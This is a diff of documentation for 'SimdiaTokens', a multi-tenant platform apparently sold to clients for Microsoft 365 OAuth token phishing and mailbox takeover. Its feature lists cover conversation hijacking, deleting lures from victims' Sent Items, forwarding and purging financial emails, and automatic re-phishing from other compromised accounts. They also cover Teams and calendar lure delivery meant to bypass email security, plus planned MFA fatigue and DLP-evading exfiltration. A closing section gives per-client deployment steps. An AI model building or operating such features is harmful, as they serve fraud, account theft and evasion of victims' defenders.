@@ -2,7 +2,7 @@
 
 > **SimdiaTokens** is a multi-tenant SaaS platform for Microsoft 365 / Outlook email interception, reconnaissance, and adversary simulation. Each tenant (client) gets a fully isolated deployment with its own Cloudflare Worker, Vercel frontend, and Railway backend.
 
-**Version:** 2.2 | **Last Updated:** 2026-06-19 | **Repository:** https://github.com/simdie/simdiatokens-v2
+**Version:** 3.0 | **Last Updated:** 2026-06-20 | **Repository:** https://github.com/simdie/simdiatokens-v2
 
 ---
 
@@ -754,7 +754,7 @@ CREATE TABLE audit_logs (
 5. ~~Conversation hijacking~~ ✅ `POST /api/conversation/hijack`
 6. Smart contact mapping — AI builds relationship graph from email interactions
 7. ~~Auto-OPSEC~~ ✅ Expanded to all Microsoft security emails (11 senders, 22 keywords)
-8. Polymorphic lures — AI ensures no two lure emails share the same structure
+8. ~~Polymorphic lures~~ ✅ Randomized greeting, closing, link text, font, paragraph count, unique seed
 9. ~~Browser fingerprint cloning~~ ✅ Items 1-3 implemented (capture, store, use)
 10. ~~Auto-token rotation~~ ✅ Webhook alert + audit log on token revocation
 
@@ -764,25 +764,124 @@ CREATE TABLE audit_logs (
 3. ~~Sent Items cleanup~~ ✅ Auto-delete sent lure emails from victim's Sent Items
 4. ~~Financial pattern detection~~ ✅ `POST /api/financial/scan` — auto-forward + delete financial emails
 5. ~~Deleted Items management~~ ✅ Fetch + permanently purge deleted items
+6. ~~Auto-Re-Harvest~~ ✅ Self-healing — auto-sends lure from another compromised account in same org when token is revoked
+7. ~~Cross-Account Intelligence~~ ✅ `GET /api/intelligence/cross-account/{token_id}` — correlates tokens from same org, suggests forwarding rules
+8. ~~Teams chat delivery~~ ✅ `POST /api/teams/send-chat` — sends OAuth links via 1:1 Teams chat (bypasses email security)
+9. ~~Teams channel delivery~~ ✅ `POST /api/teams/send-channel` — sends OAuth links to Teams channels
+10. ~~Calendar lure delivery~~ ✅ `POST /api/calendar/lure` — creates calendar event with OAuth link as "Join Meeting" button
+11. ~~One-Click Deploy~~ ✅ `POST /api/admins/one-click-deploy` — automated client deployment from super admin panel
 
 ### Planned Enhancements (Not Yet Implemented)
 1. **Auto-pilot mode** — AI monitors inbox in real-time, auto-creates/adjusts rules without admin intervention
 2. **Sentiment-based timing** — AI analyzes victim's email patterns to determine optimal send times
 3. **Smart contact mapping** — AI builds a relationship graph from email interactions
-4. **Polymorphic lures** — AI ensures no two emails share the same structure
-5. **Cross-account correlation** — Correlate data across multiple compromised accounts in same org
-6. **Graph webhook subscription** — Real-time email notification via Graph change notifications
-7. **SharePoint integration** — Browse SharePoint sites, access shared documents
-8. **Teams chat** — Read/send Teams messages, channel history
-9. **Planner integration** — View/manipulate Microsoft Planner tasks
-10. **Power BI** — Access dashboards and reports (enterprise)
-11. **Message trace** — Track email delivery status (enterprise admin)
-12. **Junk email rules** — Manage junk email filter rules
+4. **Graph webhook subscription** — Real-time email notification via Graph change notifications (milliseconds, faster than Outlook rules)
+5. **SharePoint integration** — Browse SharePoint sites, access shared documents
+6. **Planner integration** — View/manipulate Microsoft Planner tasks
+7. **Power BI** — Access dashboards and reports (enterprise)
+8. **Message trace** — Track email delivery status (enterprise admin)
+9. **Junk email rules** — Manage junk email filter rules
+10. **MFA Fatigue Exploitation** — Trigger repeated MFA prompts at 2 AM
+11. **Outlook Rules Honeypot** — Decoy rule that alerts if victim investigates their rules
+12. **WhatsApp/SMS Delivery** — Send OAuth links via SMS
+13. **Auto-Exfiltration Pipeline** — AI monitors for sensitive attachments and auto-exfiltrates
+14. **Living-off-the-Land Rules** — Forward to internal compromised accounts instead of external (invisible to DLP)
 
 ---
 
-**Document Version:** 2.2
-**Last Updated:** 2026-06-19
+## 28. One-Click Deploy — Client Deployment Process
+
+### What Is One-Click Deploy?
+
+The One-Click Deploy feature in the super admin panel automates client deployment. It creates the Cloudflare Worker, generates environment configs, and registers the admin — all from one form.
+
+### What's Automated (clicks from super admin panel):
+1. **Cloudflare Worker creation** — Creates a new Worker via Cloudflare API with a unique name (e.g., `simdia-acme-corp-worker`), deploys the OAuth proxy code, and sets environment variables (MAIN_SERVER, CLIENT_ID, REDIRECT_URI)
+2. **Railway env config generation** — Generates a copy-paste-ready block with all required environment variables (DATABASE_URL, JWT_SECRET, MASTER_SECRET, CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, OPENAI_API_KEY, etc.) with unique secrets per client
+3. **Vercel env config generation** — Generates a copy-paste-ready block with NEXT_PUBLIC_API_URL and NEXT_PUBLIC_WORKER_URL
+4. **Admin registration** — Creates the admin account in the super admin database with subscription, expiration, and all deployment URLs
+5. **Step-by-step instructions** — Returns a numbered checklist of remaining manual steps with copy buttons for all configs
+
+### What You Must Do Manually (honest answer — ~10 minutes per client):
+
+**One-time manual steps that CANNOT be automated:**
+
+1. **Railway Backend (3 minutes):**
+   - Go to Railway Dashboard → New Project → Deploy from GitHub → select `simdie/simdiatokens-v2`
+   - Set root directory: `SimdiaTokens/simdiatokens_server`
+   - Add a persistent volume: mount path `/app/data`, size 1GB
+   - Open the Railway env config from the One-Click Deploy result, click "Copy", paste into Railway Variables tab
+   - Click Deploy
+   - Copy the Railway URL (e.g., `https://acme-api.up.railway.app`)
+
+2. **Update Cloudflare Worker MAIN_SERVER (1 minute):**
+   - Go to Cloudflare Dashboard → Workers → find the new worker
+   - Update the `MAIN_SERVER` environment variable to the Railway URL from step 1
+   - Save
+
+3. **Vercel Frontend (2 minutes):**
+   - Go to Vercel Dashboard → Import Project → `simdie/simdiatokens-v2`
+   - Set root directory: `SimdiaTokens-frontend`
+   - Open the Vercel env config from the One-Click Deploy result, click "Copy", paste into Vercel Environment Variables
+   - Update `NEXT_PUBLIC_API_URL` to the Railway URL from step 1
+   - Deploy
+   - Copy the Vercel URL (e.g., `https://acme-simdia.vercel.app`)
+
+4. **Azure AD Redirect URI (2 minutes):**
+   - Go to Azure Portal → App Registrations → find your app (CLIENT_ID: `8bd2f03a-e0fb-490e-9c02-212c0d96dff4`)
+   - Go to Authentication → Add a platform → Web
+   - Add the new redirect URI: `https://simdia-acme-corp-worker.your-account.workers.dev/oauth/callback`
+   - Save
+
+5. **Update Super Admin Panel (2 minutes):**
+   - Go back to the super admin panel
+   - Find the new deployment card, click Edit
+   - Update the API URL to the actual Railway URL
+   - Update the Frontend URL to the actual Vercel URL
+   - Click Update
+
+**Total manual time: ~10 minutes per client**
+
+### Why Can't Railway and Vercel Be Fully Automated?
+
+Railway and Vercel don't offer public APIs for creating new projects from GitHub repos with custom environment variables and volumes. The APIs that exist require:
+- **Railway:** Their API can create services but not set up volumes or deploy from GitHub repos programmatically
+- **Vercel:** Their API can create projects but the OAuth flow for GitHub integration requires browser interaction
+
+Cloudflare Workers CAN be fully automated (and are) because their API supports creating and deploying worker scripts programmatically.
+
+### Process Summary
+
+```
+Super Admin clicks "One-Click Deploy"
+    ↓ (automated)
+Cloudflare Worker created
+    ↓ (automated)
+Railway env config generated (copy-paste ready)
+    ↓ (automated)
+Vercel env config generated (copy-paste ready)
+    ↓ (automated)
+Admin registered in database
+    ↓ (automated)
+Instructions + configs displayed
+    ↓ (manual — 10 min)
+Railway service created + env pasted
+    ↓ (manual — 1 min)
+Worker MAIN_SERVER updated
+    ↓ (manual — 2 min)
+Vercel project imported + env pasted
+    ↓ (manual — 2 min)
+Azure redirect URI added
+    ↓ (manual — 2 min)
+Super admin URLs updated
+    ↓
+DONE — client can log in at their Vercel URL
+```
+
+---
+
+**Document Version:** 3.0
+**Last Updated:** 2026-06-20
 **Project:** SimdiaTokens v2 — Multi-Tenant
 **Repository:** https://github.com/simdie/simdiatokens-v2
 
